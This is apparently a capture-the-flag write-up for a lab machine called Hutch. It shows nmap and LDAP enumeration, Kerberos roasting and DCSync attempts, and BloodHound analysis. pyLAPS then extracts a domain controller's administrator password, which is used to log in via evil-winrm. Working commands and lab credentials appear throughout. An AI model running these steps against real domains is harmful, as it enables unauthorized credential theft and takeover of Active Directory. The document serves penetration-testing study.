---
description: Owning DC machine with misconfiguration in LAPS service
---

# Hutch

## Summary

* I got the initial foothold to the machine using the credential discovered during LDAP enumeration.&#x20;
* Found LAPS misconfiguration issue using Bloodhound, where `fmcsorley` user has the ability to read the password set by LAPS on the DC machine.&#x20;
* Used this weekness to read the administrator password in plain text, finally getting both the flags.&#x20;



## Let's unpack

### Enumeration

```bash
# NMAP
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.223.122

Nmap scan report for hutch.offsec (192.168.223.122)
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Server Date: Sun, 30 Jun 2024 14:54:04 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_  WebDAV type: Unknown
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 14:53:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-30T14:54:10
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   116.26 ms 192.168.45.1
2   114.35 ms 192.168.45.254
3   116.32 ms 192.168.251.1
4   116.32 ms hutch.offsec (192.168.223.122)



```



Using LDAP to list all usernames and their descriptions

```bash
ldapsearch -x -H ldap://192.168.223.122 -D '' -w '' -b "DC=hutch,DC=offsec"
>
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.

# validated the credentials using CME
crackmapexec smb 192.168.223.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' --continue-on-success
```



### Initial Foothold

Since remote access was disabled for this user, this machine is not vulnerable to AD-related common vulnerabilities like AS-REP, Kerberoast, DCSync, etc. I decided to use Bloodhound-python

```bash
# Checking for AS-REP Roasting
kerbrute userenum --dc 192.168.223.122 -d hutch.offsec -o kerbrute.username.out user.txt

# same using impacket
impacket-GetNPUsers -dc-ip 192.168.223.122 -no-pass -usersfile user.txt  hutch.offsec/ 

# Trying Kerberoasting
sudo impacket-GetUserSPNs -request -dc-ip 192.168.223.122 hutch.offsec/fmcsorley

# Trying DCSync
impacket-secretsdump -just-dc-user rplacidi hutch.offsec/fmcsorley:"CrabSharkJellyfish192"@192.168.223.122

# Enumerating SMB
crackmapexec smb 192.168.223.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M spider_plus

# ---- NO Luck----#

```



Trying Bloodhound

```bash
bloodhound-python -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -ns 192.168.223.122 -c All

```

#### FIndings

* The user FMCSORLEY@HUTCH.OFFSEC has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer HUTCHDC.HUTCH.OFFSEC.

<figure><img src="../.gitbook/assets/Screenshot 2024-07-08 at 5.34.28 PM.png" alt=""><figcaption></figcaption></figure>

#### Read more about LAPS here:

* [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
* [https://adsecurity.org/?p=3164](https://adsecurity.org/?p=3164)
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/an\_ace\_up\_the\_sleeve.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/an\_ace\_up\_the\_sleeve.pdf)

### Privilege Escalation/Lateral Movement

Reading Administrator Password using LAPS misconfiguration using [pyLAPS](https://github.com/p0dalirius/pyLAPS)

Tool Used -> [https://github.com/p0dalirius/pyLAPS](https://github.com/p0dalirius/pyLAPS)

```bash
python pyLAPS.py --action get -u 'fmcsorley' -d 'hutch.offsec' -p 'CrabSharkJellyfish192' --dc-ip 192.168.223.122
>
[+] Extracting LAPS passwords of all computers ... 
  | HUTCHDC$             : 9kv,QRf@39912a
[+] All done!

# checking if the password belonged to any user
crackmapexec smb 192.168.223.122 -u ../user.txt -p '9kv,QRf@39912a' --continue-on-success 
>
SMB 192.168.223.122 445    HUTCHDC  [+] hutch.offsec\administrator:9kv,QRf@39912a (Pwn3d!)

```

Perfect! We got the administrator user's password in plain text. We can <mark style="color:red;">winrm</mark> to the machine and read flags for lower privilege users and Administrator, i.e. `proof.txt`

```bash
evil-winrm -i 192.168.223.122 -u administrator -p '9kv,QRf@39912a'

# Boom!  got local admin access
```

